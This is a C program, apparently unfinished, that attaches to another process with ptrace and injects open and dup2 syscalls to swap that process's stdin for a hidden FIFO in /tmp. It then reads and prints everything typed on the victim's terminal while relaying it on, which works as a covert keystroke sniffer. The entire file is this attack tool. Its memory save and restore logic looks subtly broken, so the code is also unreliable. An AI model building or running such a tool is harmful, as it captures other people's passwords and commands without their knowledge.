#include <errno.h>
#include <error.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

#define BUFFER_SIZE 32

int main(int argc, char **argv){

	int target_pid;
  uid_t uid;

  int pipe_fd_out, tty_fd_in, remote_fd;
	char tmp_buffer[BUFFER_SIZE];
	char path[BUFFER_SIZE];
	long ptrace_ret;
	struct user_regs_struct saved_regs, attack_regs;

	char next_char;
	int i;


	if(argc != 2){
		fprintf(stderr, "usage: %s PID\n", argv[0]);
		exit(-1);
	}

/* grab pid from argv[1] */
	errno = 0;
	target_pid = strtol(argv[1], NULL, 10);
	if(errno){
		error(-1, errno, "strtol()");
	}

/* find the pids /proc fd entry for stdin, and dereference the link. */
	memset(path, 0, sizeof(path));
	if(snprintf(path, sizeof(path), "/proc/%d/fd/0", target_pid) < 0){
    error(-1, errno, "snprintf()");
  }

	memset(tmp_buffer, 0, sizeof(tmp_buffer));
	errno = 0;
	if(readlink(path, tmp_buffer, sizeof(tmp_buffer)) == -1){
		error(-1, errno, "readlink()");
	}
	
	printf("DEBUG: tmp_buffer: %s\n", tmp_buffer);


/* setup the fifo */
	uid = getuid();

	memset(path, 0, sizeof(path));
	if(snprintf(path, sizeof(path), "/tmp/.%d.%d", (int) uid, target_pid) < 0){
    error(-1, errno, "snprintf()");
  }

  if(mkfifo(path, S_IRUSR|S_IWUSR)){
    error(-1, errno, "mkfifo()");
  }

  if((tty_fd_in = open(tmp_buffer, O_RDONLY)) < 0){
    error(-1, errno, "open()");
  }


/* Start ptrace() segment */

  errno = 0;
  if((ptrace_ret = ptrace(PTRACE_ATTACH, target_pid, NULL, NULL)) == -1){
    if(errno){
      error(-1, errno, "ptrace(PTRACE_ATTACH, target_pid, NULL, NULL)");
    }
  }

  if(wait(NULL) == -1){
    error(-1, errno, "wait()");
  }


/*
		dup2(open(path, 0), stdin)

			attach
		 	copy regs state
		 	set regs for open syscall
		 	syscall
		 	set regs for dup2 syscall
		 	syscall
			restore regs state
			detatch
*/

	memset(&saved_regs, 0, sizeof(saved_regs));
  errno = 0;
  if((ptrace_ret = ptrace(PTRACE_GETREGS, target_pid, NULL, &saved_regs)) == -1){
    if(errno){
      error(-1, errno, "ptrace(PTRACE_GETREGS, target_pid, NULL, &saved_regs)");
    }
  }

// XXX trying to save state of mem.
	memset(&tmp_buffer, 0, sizeof(tmp_buffer));
	for(i = 0; i < (int) sizeof(tmp_buffer); i++){
		printf("DEBUG: i: %d\n", i);
		errno = 0;
		if((tmp_buffer[i] = ptrace(PTRACE_PEEKDATA, target_pid, saved_regs.rbp + i * 4, NULL)) == -1){
			if(errno){
				error(-1, errno, "ptrace(PTRACE_PEEKDATA, target_pid, saved_regs.rbp + i * 4, NULL)");
			}
		}
	}

// XXX now load the value we want.
  for(i = 0; i < (int) sizeof(path); i++){
    errno = 0;
    if((ptrace_ret = ptrace(PTRACE_POKEDATA, target_pid, saved_regs.rbp + i * 4, path[i])) == -1){
      if(errno){
        error(-1, errno, "ptrace(PTRACE_POKEDATA, target_pid, saved_regs.rbp + i * 4, path[i])");
      }
    }
  }


	memset(&attack_regs, 0, sizeof(attack_regs));
	attack_regs.rax = __NR_open;
	attack_regs.rdi = saved_regs.rbp;
	attack_regs.rsi = O_RDONLY;

	printf("DEBUG: attack_regs.rax: %d\n", (int) attack_regs.rax);
	printf("DEBUG: attack_regs.rdi: %lx\n", attack_regs.rdi);
	printf("DEBUG: attack_regs.rsi: %d\n", (int) attack_regs.rsi);

	errno = 0;
	if((ptrace_ret = ptrace(PTRACE_SETREGS, target_pid, NULL, &attack_regs)) == -1){
		if(errno){
			error(-1, errno, "ptrace(PTRACE_SETREGS, target_pid, NULL, &attack_regs)");
		}
	}

	errno = 0;
	if((ptrace_ret = ptrace(PTRACE_SYSCALL, target_pid, NULL, &attack_regs)) == -1){
		if(errno){
			error(-1, errno, "ptrace(PTRACE_SYSCALL, target_pid, NULL, &attack_regs)");
		}
	}

	errno = 0;
	if((ptrace_ret = ptrace(PTRACE_GETREGS, target_pid, NULL, &attack_regs)) == -1){
		if(errno){
			error(-1, errno, "ptrace(PTRACE_GETREGS, target_pid, NULL, &attack_regs)");
		}
	}

	remote_fd = attack_regs.rax;

	memset(&attack_regs, 0, sizeof(attack_regs));
	attack_regs.rax = __NR_dup2;
	attack_regs.rdi = remote_fd;
	attack_regs.rsi = 0;

	errno = 0;
	if((ptrace_ret = ptrace(PTRACE_SETREGS, target_pid, NULL, &attack_regs)) == -1){
		if(errno){
			error(-1, errno, "ptrace(PTRACE_SETREGS, target_pid, NULL, &attack_regs)");
		}
	}

	errno = 0;
	if((ptrace_ret = ptrace(PTRACE_SYSCALL, target_pid, NULL, &attack_regs)) == -1){
		if(errno){
			error(-1, errno, "ptrace(PTRACE_SYSCALL, target_pid, NULL, &attack_regs)");
		}
	}

	errno = 0;
	if((ptrace_ret = ptrace(PTRACE_SETREGS, target_pid, NULL, &saved_regs)) == -1){
		if(errno){
			error(-1, errno, "ptrace(PTRACE_SETREGS, target_pid, NULL, &saved_regs)");
		}
	}

// XXX now restore mem
  for(i = 0; i < (int) sizeof(tmp_buffer); i++){
    errno = 0;
    if((ptrace_ret = ptrace(PTRACE_POKEDATA, target_pid, saved_regs.rbp + i * 4, tmp_buffer[i])) == -1){
      if(errno){
        error(-1, errno, "ptrace(PTRACE_POKEDATA, target_pid, saved_regs.rbp + i * 4 , tmp_buffer[i])");
      }
    }
	}

	errno = 0;
	if((ptrace_ret = ptrace(PTRACE_DETACH, target_pid, NULL, NULL)) == -1){
		if(errno){
			error(-1, errno, "ptrace(PTRACE_DETACH, target_pid, NULL, NULL)");
		}
	}

	/* End ptrace() segment */


	/*
		 Opening a fifo will block the calling process till the other end is also opened.
		 you *can* do a non-blocking fifo, but the read side will need to be opened first or
		 opening to write will fail. man 7 fifo
	 */
	if((pipe_fd_out = open(path, O_WRONLY)) < 0){
		error(-1, errno, "open()");
	}


	/* print everything you hear on the target's old stdin */
	errno = 0;
	while(read(tty_fd_in, &next_char, sizeof(char))){
		if(errno){
			error(-1, errno, "read()");
		}	

		printf("%c", (int) next_char);

		errno = 0;
		write(pipe_fd_out, &next_char, sizeof(char));
		if(errno){
			error(-1, errno, "write()");
		}
	}

	/* close up and clear out */
	if(close(pipe_fd_out)){
		error(-1, errno, "close()");
	}

	if(unlink(path)){
		error(-1, errno, "unlink()");
	}

	return(0);
}
